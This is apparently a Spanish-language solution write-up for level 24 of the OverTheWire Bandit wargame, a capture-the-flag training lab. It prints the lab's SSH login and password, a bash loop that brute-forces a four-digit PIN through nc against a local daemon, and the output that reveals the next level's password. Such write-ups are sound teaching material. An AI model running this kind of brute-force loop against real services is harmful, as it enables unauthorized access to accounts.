## Objetivo
Deberemos obtener la contraseña para el siguiente nivel (`bandit25`) al proporcionar al demonio que escucha en el puerto 30002 la contraseña actual de `bandit24` junto con un código PIN numérico de 4 dígitos. Dado que no hay forma de recuperar el código PIN de otra manera, será necesario realizar un ataque de fuerza bruta probando todas las combinaciones posibles (de 0000 a 9999).

## Datos de Acceso al Nivel
- **comando:** ssh
- **host:** bandit.labs.overthewire.org
- **puerto:** 2220
- **usuario:** bandit24
- **contraseña:** gb8KRRCsshuZXI0tUuR6ypOFjiZbf3G8

## Solución
```bash
for i in {0000..9999}; do echo gb8KRRCsshuZXI0tUuR6ypOFjiZbf3G8 $i; done | nc localhost 30002 | grep -v 'Wrong'
```
```text
I am the pincode checker for user bandit25. Please enter the password for user bandit24 and the secret pincode on a single line, separated by a space.
Correct!
The password of user bandit25 is iCi86ttT4KSNe1armKiwbQNmB3YJP3q4

```

## Notas Adicionales


## Referencias